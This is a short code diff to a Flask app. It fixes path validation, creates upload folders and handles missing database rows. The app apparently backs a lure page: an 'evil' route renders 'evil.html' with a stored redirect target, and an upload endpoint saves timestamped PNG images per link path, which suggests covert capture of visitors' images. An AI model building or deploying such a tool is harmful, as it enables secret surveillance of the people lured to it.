@@ -5,6 +5,8 @@ import logging
 import time
 import sqlite3
 import re
+import pathlib
+import os
 
 logging.basicConfig(level=logging.INFO)
 
@@ -17,17 +19,21 @@ cur = conn.cursor()
 
 cur.execute('CREATE TABLE IF NOT EXISTS links (path TEXT, target TEXT)')
 
-valid = re.compile(r'^/[a-zA-Z0-9_\-]{1,}$')
+valid = re.compile(r'^[a-zA-Z0-9_\-]{1,}$')
 
 
 @app.route('/upload', methods=['POST'])
 def upload():
+    global count
     app.logger.info('upload')
     file = request.files.get('file')
     path = request.args.get('path')
-    if valid.match(path) is None:
+    if path is None or valid.match(path) is None:
         return 'invalid path', 400
 
+    if not pathlib.Path(f'photos/{path}').is_dir():
+        os.makedirs(f'photos/{path}')
+        
     file.save(
         f'photos/{path}/{time.strftime("%Y-%m-%d %H %M %S")} [{count}].png')
     count = count + 1 if count < 100 else 0
@@ -68,8 +74,11 @@ def getLink():
 def evil(path):
     cur.execute('SELECT * FROM links WHERE path = ?',
                 (path,))
-    target = cur.fetchone()[1]
-    return render_template('evil.html', target=target)
+    fetch = cur.fetchone()
+    if fetch is None:
+        return render_template('evil.html', target='', path=path)
+
+    return render_template('evil.html', target=fetch[1], path=path)
 
 
 if __name__ == '__main__':
